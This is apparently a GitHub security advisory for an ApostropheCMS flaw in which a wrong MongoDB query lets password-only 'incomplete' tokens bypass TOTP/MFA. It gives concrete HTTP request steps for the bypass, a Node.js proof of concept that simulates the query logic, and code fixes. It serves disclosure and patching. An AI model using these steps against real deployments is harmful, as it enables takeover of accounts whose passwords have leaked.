# [H] ApostropheCMS MFA/TOTP Bypass via Incorrect MongoDB Query in Bearer Token Middleware

## Summary
Severity: High
Advisory: GHSA-v9xm-ffx2-7h35
CVE: CVE-2026-32730
CWE: CWE-287, CWE-305
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-03-18
Source: https://github.com/advisories/GHSA-v9xm-ffx2-7h35
Type: github-advisory

## Affected
- npm: `apostrophe` — affected >=0 <4.28.0

## Details
# MFA/TOTP Bypass via Incorrect MongoDB Query in Bearer Token Middleware

## Summary

The bearer token authentication middleware in `@apostrophecms/express/index.js` (lines 386-389) contains an incorrect MongoDB query that allows incomplete login tokens — where the password was verified but TOTP/MFA requirements were NOT — to be used as fully authenticated bearer tokens. This completely bypasses multi-factor authentication for any ApostropheCMS deployment using `@apostrophecms/login-totp` or any custom `afterPasswordVerified` login requirement.

## Severity

The AC is High because the attacker must first obtain the victim's password. However, the entire purpose of MFA is to protect accounts when passwords are compromised (credential stuffing, phishing, database breaches), so this bypass negates the security control entirely.

## Affected Versions

All versions of ApostropheCMS from 3.0.0 to 4.27.1, when used with `@apostrophecms/login-totp` or any custom `afterPasswordVerified` requirement.

## Root Cause

In `packages/apostrophe/modules/@apostrophecms/express/index.js`, the `getBearer()` function (line 377) queries MongoDB for valid bearer tokens. The query at lines 386-389 is intended to only match tokens where the `requirementsToVerify` array is either absent (no MFA configured) or empty (all MFA requirements completed):

```javascript
async function getBearer() {
    const bearer = await self.apos.login.bearerTokens.findOne({
        _id: req.token,
        expires: { $gte: new Date() },
        // requirementsToVerify array should be empty or inexistant
        // for the token to be usable to log in.
        $or: [
            { requirementsToVerify: { $exists: false } },
            { requirementsToVerify: { $ne: [] } }  // BUG
        ]
    });
    return bearer && bearer.userId;
}
```

The comment correctly states the intent: the array should be "empty or inexistant." However, the MongoDB operator `$ne: []` matches documents where `requirementsToVerify` is **NOT** an empty array — meaning it matches tokens that still have **unverified requirements**. This is the exact opposite of the intended behavior.

| Token State | `requirementsToVerify` | `$ne: []` result | Should match? |
|---|---|---|---|
| No MFA configured | *(field absent)* | N/A (`$exists: false` matches) | Yes |
| TOTP pending | `["AposTotp"]` | `true` (BUG!) | **No** |
| All verified | `[]` | `false` (BUG!) | **Yes** |
| Field removed (`$unset`) | *(field absent)* | N/A (`$exists: false` matches) | Yes |

## Attack Scenario

### Prerequisites
- ApostropheCMS instance with `@apostrophecms/login-totp` enabled
- Attacker knows the victim's username and password (e.g., from credential stuffing, phishing, or a database breach)
- Attacker does NOT know the victim's TOTP secret/code

### Steps

1. **Authenticate with password only:**
   ```
   POST /api/v1/@apostrophecms/login/login
   Content-Type: application/json

   {"username": "admin", "password": "correct_password", "session": false}
   ```

2. **Receive incomplete token** (server correctly requires TOTP):
   ```json
   {"incompleteToken": "clxxxxxxxxxxxxxxxxxxxxxxxxx"}
   ```

3. **Use incomplete token as bearer token** (bypassing TOTP):
   ```
   GET /api/v1/@apostrophecms/page
   Authorization: Bearer clxxxxxxxxxxxxxxxxxxxxxxxxx
   ```

4. **Full authenticated access granted.** The bearer token middleware matches the token because `requirementsToVerify: ["AposTotp"]` satisfies `$ne: []`. The attacker has complete API access as the victim without ever providing a TOTP code.

## Proof of Concept

See `mfa-bypass-poc.js` — demonstrates the query logic bug with all token states. Run:

```bash
#!/usr/bin/env node
/**
 * PoC: MFA/TOTP Bypass via Incorrect MongoDB Query in Bearer Token Middleware
 *
 * ApostropheCMS's bearer token middleware in @apostrophecms/express/index.js
 * has a logic error in the MongoDB query that validates bearer tokens.
 *
 * The comment says:
 *   "requirementsToVerify array should be empty or inexistant
 *    for the token to be usable to log in."
 *
 * But the actual query uses `$ne: []` (NOT equal to empty array),
 * which matches tokens WITH unverified requirements — the exact opposite
 * of the intended behavior.
 *
 * This allows an attacker who knows a user's password (but NOT their
 * TOTP code) to use the "incompleteToken" returned after password
 * verification as a fully authenticated bearer token, bypassing MFA.
 *
 * Affected: ApostropheCMS with @apostrophecms/login-totp (or any
 * custom afterPasswordVerified requirement)
 *
 * File: packages/apostrophe/modules/@apostrophecms/express/index.js:386-389
 */

const RED = '\x1b[91m';
const GREEN = '\x1b[92m';
const YELLOW = '\x1b[93m';
const CYAN = '\x1b[96m';
const RESET = '\x1b[0m';
const BOLD = '\x1b[1m';

// Simulate MongoDB's $ne operator behavior
function mongoNe(fieldValue, compareValue) {
  // MongoDB $ne: true if field value is NOT equal to compareValue
  // For arrays, MongoDB compares by value
  if (Array.isArray(fieldValue) && Array.isArray(compareValue)) {
    if (fieldValue.length !== compareValue.length) return true;
    return fieldValue.some((v, i) => v !== compareValue[i]);
  }
  return fieldValue !== compareValue;
}

// Simulate MongoDB's $exists operator
function mongoExists(doc, field, shouldExist) {
  const exists = field in doc;
  return exists === shouldExist;
}

// Simulate MongoDB's $size operator
function mongoSize(fieldValue, size) {
  if (!Array.isArray(fieldValue)) return false;
  return fieldValue.length === size;
}

// Simulate the VULNERABLE bearer token query (line 386-389)
function vulnerableQuery(token) {
  // $or: [
  //   { requirementsToVerify: { $exists: false } },
  //   { requirementsToVerify: { $ne: [] } }     <-- BUG
  // ]
  const cond1 = mongoExists(token, 'requirementsToVerify', false);
  const cond2 = ('requirementsToVerify' in token)
    ? mongoNe(token.requirementsToVerify, [])
    : false;
  return cond1 || cond2;
}

// Simulate the FIXED bearer token query
function fixedQuery(token) {
  // $or: [
  //   { requirementsToVerify: { $exists: false } },
  //   { requirementsToVerify: { $size: 0 } }    <-- FIX
  // ]
  const cond1 = mongoExists(token, 'requirementsToVerify', false);
  const cond2 = ('requirementsToVerify' in token)
    ? mongoSize(token.requirementsToVerify, 0)
    : false;
  return cond1 || cond2;
}

function banner() {
  console.log(`${CYAN}${BOLD}
╔══════════════════════════════════════════════════════════════════╗
║  ApostropheCMS MFA/TOTP Bypass PoC                              ║
║  Bearer Token Middleware — Incorrect MongoDB Query ($ne vs $eq)  ║
║  @apostrophecms/express/index.js:386-389                         ║
╚══════════════════════════════════════════════════════════════════╝${RESET}
`);
}

function test(name, token, expectedVuln, expectedFixed) {
  const vulnResult = vulnerableQuery(token);
  const fixedResult = fixedQuery(token);

  const vulnCorrect = vulnResult === expectedVuln;
  const fixedCorrect = fixedResult === expectedFixed;

  console.log(`${BOLD}${name}${RESET}`);
  console.log(`  Token: ${JSON.stringify(token)}`);
  console.log(`  Vulnerable query matches: ${vulnResult ? GREEN + 'YES' : RED + 'NO'}${RESET} (${vulnCorrect ? 'expected' : RED + 'UNEXPECTED!' + RESET})`);
  console.log(`  Fixed query matches:      ${fixedResult ? GREEN + 'YES' : RED + 'NO'}${RESET} (${fixedCorrect ? 'expected' : RED + 'UNEXPECTED!' + RESET})`);

  if (vulnResult && !fixedResult) {
    console.log(`  ${RED}=> BYPASS: Token accepted by vulnerable code but rejected by fix!${RESET}`);
  }
  console.log();
  return vulnResult && !fixedResult;
}

// ——— Main ———
banner();
const bypasses = [];

console.log(`${BOLD}--- Token States During Login Flow ---${RESET}\n`);

// 1. Normal bearer token (no MFA configured)
// Created by initialLogin when there are no lateRequirements
// Token: { _id: "xxx", userId: "yyy", expires: Date }
// No requirementsToVerify field at all
test(
  '[Token 1] Normal bearer token (no MFA) — should be ACCEPTED',
  { _id: 'token1', userId: 'user1', expires: new Date(Date.now() + 86400000) },
  true,  // vulnerable: accepted (correct)
  true   // fixed: accepted (correct)
);

// 2. Incomplete token — password verified, TOTP NOT verified
// Created by initialLogin when lateRequirements exist
// Token: { _id: "xxx", userId: "yyy", requirementsToVerify: ["AposTotp"], expires: Date }
const bypass1 = test(
  '[Token 2] Incomplete token (TOTP NOT verified) — should be REJECTED',
  { _id: 'token2', userId: 'user2', requirementsToVerify: ['AposTotp'], expires: new Date(Date.now() + 3600000) },
  true,  // vulnerable: ACCEPTED (BUG! $ne:[] matches ['AposTotp'])
  false  // fixed: rejected (correct)
);
if (bypass1) bypasses.push('TOTP bypass');

// 3. Token after all requirements verified (empty array, before $unset)
// After requirementVerify pulls each requirement from the array
// Token: { _id: "xxx", userId: "yyy", requirementsToVerify: [], expires: Date }
test(
  '[Token 3] All requirements verified (empty array) — should be ACCEPTED',
  { _id: 'token3', userId: 'user3', requirementsToVerify: [], expires: new Date(Date.now() + 86400000) },
  false, // vulnerable: REJECTED (BUG! $ne:[] does NOT match [])
  true   // fixed: accepted (correct)
);

// 4. Finalized token (requirementsToVerify removed via $unset)
// After finalizeIncompleteLogin calls $unset
// Token: { _id: "xxx", userId: "yyy", expires: Date }
test(
  '[Token 4] Finalized token ($unset completed) — should be ACCEPTED',
  { _id: 'token4', userId: 'user4', expires: new Date(Date.now() + 86400000) },
  true,  // vulnerable: accepted (correct)
  true   // fixed: accepted (correct)
);

// 5. Multiple unverified requirements
const bypass2 = test(
  '[Token 5] Multiple unverified requirements — should be REJECTED',
  { _id: 'token5', userId: 'user5', requirementsToVerify: ['AposTotp', 'CustomMFA'], expires: new Date(Date.now() + 3600000) },
  true,  // vulnerable: ACCEPTED (BUG!)
  false  // fixed: rejected (correct)
);
if (bypass2) bypasses.push('Multi-requirement bypass');

// Attack scenario
console.log(`${BOLD}--- Attack Scenario ---${RESET}\n`);
console.log(`  ${YELLOW}Prerequisites:${RESET}`);
console.log(`    - ApostropheCMS instance with @apostrophecms/login-totp enabled`);
console.log(`    - Attacker knows victim's username and password`);
console.log(`    - Attacker does NOT know victim's TOTP code\n`);

console.log(`  ${YELLOW}Step 1:${RESET} Attacker sends login request with valid credentials`);
console.log(`    POST /api/v1/@apostrophecms/login/login`);
console.log(`    {"username": "admin", "password": "correct_password", "session": false}\n`);

console.log(`  ${YELLOW}Step 2:${RESET} Server verifies password, returns incomplete token`);
console.log(`    Response: {"incompleteToken": "clxxxxxxxxxxxxxxxxxxxxxxxxx"}`);
console.log(`    (TOTP verification still required)\n`);

console.log(`  ${YELLOW}Step 3:${RESET} Attacker uses incompleteToken as a Bearer token`);
console.log(`    GET /api/v1/@apostrophecms/page`);
console.log(`    Authorization: Bearer clxxxxxxxxxxxxxxxxxxxxxxxxx\n`);

console.log(`  ${YELLOW}Step 4:${RESET} Bearer token middleware runs getBearer() query`);
console.log(`    MongoDB query: {`);
console.log(`      _id: "clxxxxxxxxxxxxxxxxxxxxxxxxx",`);
console.log(`      expires: { $gte: new Date() },`);
console.log(`      $or: [`);
console.log(`        { requirementsToVerify: { $exists: false } },`);
console.log(`        { requirementsToVerify: { ${RED}$ne: []${RESET} } }  // BUG!`);
console.log(`      ]`);
console.log(`    }`);
console.log(`    The token has requirementsToVerify: ["AposTotp"]`);
console.log(`    $ne: [] matches because ["AposTotp"] !== []\n`);

console.log(`  ${RED}Step 5: Attacker is fully authenticated as the victim!${RESET}`);
console.log(`    req.user is set, req.csrfExempt = true`);
console.log(`    Full API access without TOTP verification\n`);

// Summary
console.log(`${BOLD}${'='.repeat(64)}`);
console.log(`Summary`);
console.log(`${'='.repeat(64)}${RESET}`);
console.log(`  ${bypasses.length} bypass vector(s) confirmed: ${bypasses.join(', ')}\n`);
console.log(`  ${YELLOW}Root Cause:${RESET} @apostrophecms/express/index.js line 388`);
console.log(`  The MongoDB query uses $ne: [] which matches NON-empty arrays.`);
console.log(`  The comment says the array should be "empty or inexistant",`);
console.log(`  but $ne: [] matches exactly the opposite — non-empty arrays.\n`);
console.log(`  ${YELLOW}Vulnerable code:${RESET}`);
console.log(`    $or: [`);
console.log(`      { requirementsToVerify: { $exists: false } },`);
console.log(`      { requirementsToVerify: { $ne: [] } }  // BUG`);
console.log(`    ]\n`);
console.log(`  ${YELLOW}Fixed code:${RESET}`);
console.log(`    $or: [`);
console.log(`      { requirementsToVerify: { $exists: false } },`);
console.log(`      { requirementsToVerify: { $size: 0 } }  // FIX`);
console.log(`    ]\n`);
console.log(`  ${RED}Impact:${RESET} Complete MFA bypass. An attacker who knows a user's`);
console.log(`  password can skip TOTP verification and gain full authenticated`);
console.log(`  API access by using the incompleteToken as a bearer token.\n`);
console.log(`  ${YELLOW}Additional Bug:${RESET} The same $ne:[] also causes a secondary`);
console.log(`  issue where tokens with ALL requirements verified (empty array,`);
console.log(`  before the $unset runs) are incorrectly REJECTED. This is masked`);
console.log(`  by the fact that finalizeIncompleteLogin uses $unset to remove`);
console.log(`  the field entirely, so the $exists: false path is used instead.`);
console.log();
console.log();

```

Both bypass vectors (single and multiple unverified requirements) confirmed.

## Amplifying Bug: Incorrect Token Deletion in `finalizeIncompleteLogin`

A second bug in `@apostrophecms/login/index.js` (lines 728-729, 735-736) amplifies the MFA bypass. When `finalizeIncompleteLogin` attempts to delete the incomplete token, it uses the wrong identifier:

```javascript
await self.bearerTokens.removeOne({
    _id: token.userId  // BUG: should be token._id
});
```

The token's `_id` is a CUID (e.g., `clxxxxxxxxx`), but `token.userId` is the user's document ID. This means:

1. The incomplete token is **never deleted** from the database, even after a legitimate MFA-verified login
2. Combined with the `$ne: []` bug, the incomplete token remains usable as a bearer token for its full lifetime (default: 1 hour)
3. Even if the legitimate user completes TOTP and logs in properly, the incomplete token persists

This bug appears at two locations in `finalizeIncompleteLogin`:
- Line 728-729: Error case (user not found)
- Line 735-736: Success case (session-based login after MFA)

## Recommended Fix

### Fix 1: Bearer token query (express/index.js line 388)

Replace `$ne: []` with `$size: 0`:

```javascript
$or: [
    { requirementsToVerify: { $exists: false } },
    { requirementsToVerify: { $size: 0 } }  // FIX: match empty array only
]
```

This ensures only tokens with no remaining requirements (empty array or absent field) are accepted as valid bearer tokens.

### Fix 2: Token deletion (login/index.js lines 728-729, 735-736)

Replace `token.userId` with `token._id`:

```javascript
await self.bearerTokens.removeOne({
    _id: token._id  // FIX: use the token's actual ID
});
```

## References
- https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-v9xm-ffx2-7h35
- https://nvd.nist.gov/vuln/detail/CVE-2026-32730
- https://github.com/apostrophecms/apostrophe
